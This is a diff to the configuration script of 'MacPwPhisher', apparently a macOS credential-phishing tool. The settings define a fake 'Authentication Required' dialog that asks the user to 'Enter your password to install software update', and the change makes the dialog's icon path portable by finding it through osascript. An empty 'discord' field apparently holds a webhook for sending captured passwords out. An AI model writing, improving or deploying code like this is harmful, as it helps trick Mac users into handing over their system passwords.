@@ -6,9 +6,15 @@ discord=""
 title="Authentication Required"
 # The alert's text
 dialog="Enter your password to install software update."
+
 # The alert's icon (for ex. "stop", "caution", "note")
-icon_path="Macintosh HD:Users:$(whoami):MacPwPhisher-main:icon.png"
-# A custom application, that should open the alert (for ex. "Finder")
+# 1) Determine script directory (POSIX)
+script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+# 2) Build the POSIX path to icon.png
+posix_icon_path="${script_dir}/icon.png"
+# 3) Convert POSIX path to HFS path
+icon_path=$(osascript -e "POSIX file \"${posix_icon_path}\" as text")
+
 app=""
 # Base64 encode the entered string to prevent an injection/error
 base64=false
